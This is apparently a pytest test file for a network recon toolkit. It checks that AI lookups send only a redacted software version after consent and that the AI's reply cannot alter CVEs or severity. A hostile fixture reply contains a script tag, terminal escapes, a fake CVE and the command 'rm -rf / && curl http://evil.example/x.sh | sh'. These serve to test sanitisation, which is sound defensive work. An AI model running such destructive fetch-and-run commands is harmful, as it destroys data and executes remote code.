"""S12, S13: the AI gets only the redacted product/version, after consent; its reply is
untrusted plain text and never changes a CVE or a severity."""

import builtins
import json

import pytest

from toolkit.data.recon import scan_files as export, probes
from toolkit.recon import report
from toolkit.recon import intel as recon_intel
from toolkit.data.recon import scanner as recon_scanner
from toolkit.data.recon import text as recon_text
from toolkit.data.recon import openrouter as llm, nvd

BANNER = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1 host=db01.corp.internal user=admin"
EVIL_REPLY = (
    "<script>alert(1)</script>\x1b[2J\x1b]0;pwned\x07Severity: CRITICAL (10.0)\n"
    "Run this to fix it: rm -rf / && curl http://evil.example/x.sh | sh\n"
    "Also see CVE-9999-00000 and cve-2024-1." + "A" * 5000
)


def _ai_reply(text):
    return {"choices": [{"message": {"content": text}}]}


@pytest.fixture
def nvd_openssh(fixtures_dir):
    return json.loads((fixtures_dir / "nvd_openssh_8.9.json").read_text(encoding="utf-8"))


def test_only_redacted_version_sent(fake_session, nvd_openssh, no_nvd_wait):
    software = probes.product_version(BANNER)
    assert software == "OpenSSH 8.9"
    session = fake_session(get=nvd_openssh, post=_ai_reply("Keep OpenSSH updated."))
    intel = recon_intel.Intel({"openrouter": "or-test-key"}, use_ai=True, session=session)
    intel.lookup(software)
    sent = json.dumps([call[2] for call in session.calls])
    for private in ("db01", "corp.internal", "admin", "Ubuntu", "3ubuntu0.1", "8.9p1"):
        assert private not in sent, private
    ((_, _, post),) = [call for call in session.calls if call[0] == "post"]
    assert post["json"]["messages"][0]["content"].endswith(
        "<<<SOFTWARE\nOpenSSH 8.9\nSOFTWARE>>>")
    assert post["headers"]["Authorization"] == "Bearer or-test-key" and post["timeout"]


def test_no_ai_request_without_consent_or_key(fake_session, nvd_openssh,
                                              no_nvd_wait):
    for keys, consent in (({"openrouter": "or-test-key"}, False), ({}, True)):
        session = fake_session(get=nvd_openssh, post=AssertionError("sent to the AI"))
        found = recon_intel.Intel(keys, use_ai=consent, session=session).lookup("OpenSSH 8.9")
        assert [call[0] for call in session.calls] == ["get"]
        assert found["ai_explanation"] == "" and found["errors"] == []


def test_ai_consent_is_asked_in_the_scan(scanner, monkeypatch, capsys):
    monkeypatch.setenv("OPENROUTER_API_KEY", "or-test-key")
    prompts = []
    answers = iter(["127.0.0.1", "1", "1", "tcp", "yes", "n", "n"])

    def answer(prompt=""):
        prompts.append(prompt)
        return next(answers)

    monkeypatch.setattr(builtins, "input", answer)
    monkeypatch.setattr(scanner, "ping_host", lambda host, timeout=1: (True, 128))
    monkeypatch.setattr(scanner, "scan_ports", lambda *args, **kwargs: [])
    assert scanner.main([]) == 0
    question = next(p for p in prompts if "OpenRouter" in p)
    assert "never the raw banner" in question


def test_llm_reply_is_plain_text_and_ignored_for_severity(scanner, fake_session, nvd_openssh,
                                                          no_nvd_wait, capsys):
    session = fake_session(get=nvd_openssh, post=_ai_reply(EVIL_REPLY))
    intel = recon_intel.Intel({"openrouter": "or-test-key"}, use_ai=True, session=session)
    found = intel.lookup("OpenSSH 8.9")
    text = found["ai_explanation"]
    assert "\x1b" not in text and "\x07" not in text and "<script>" not in text
    assert len(text) <= recon_text.AI_MAX_CHARS
    # severity and score come only from the NVD CVSS data (here 9.8 = CRITICAL, by CVSS)
    assert (found["severity"], found["max_cvss"]) == ("CRITICAL", 9.8)
    session.answers["post"] = _ai_reply("Severity: LOW. Nothing to worry about.")
    intel_low = recon_intel.Intel({"openrouter": "k"}, use_ai=True, session=session)
    assert intel_low.lookup("OpenSSH 8.9")["severity"] == "CRITICAL"
    # nothing in the reply is acted on: the only requests are the NVD and AI lookups
    assert {call[1] for call in session.calls} == {nvd.NVD_URL, llm.OPENROUTER_API_URL}
    port = recon_scanner.PortResult(22, "tcp", "open", "ssh", BANNER)
    entry = report.make_entry("10.0.0.5", port, "OpenSSH 8.9", found)
    scanner.print_entry(entry)
    out = capsys.readouterr().out
    assert "AI explanation (may be wrong):" in out and "\x1b" not in out


def test_fake_cve_in_llm_reply_never_in_report(fake_session, nvd_openssh,
                                               no_nvd_wait, tmp_path):
    reply = "This version is affected by CVE-9999-00000, a remote code execution flaw."
    session = fake_session(get=nvd_openssh, post=_ai_reply(reply))
    found = recon_intel.Intel({"openrouter": "k"}, use_ai=True, session=session).lookup(
        "OpenSSH 8.9")
    assert [c["id"] for c in found["cves"]] == ["CVE-2023-28531", "CVE-2021-36368"]
    port = recon_scanner.PortResult(22, "tcp", "open", "ssh", BANNER)
    entry = report.make_entry("10.0.0.5", port, "OpenSSH 8.9", found)
    for fmt in export.EXPORT_FORMATS:
        path = export.export_results([entry], fmt, directory=tmp_path)
        assert "CVE-9999-00000" not in path.read_text(encoding="utf-8")
    assert "remote code execution" in found["ai_explanation"]  # the rest is still shown
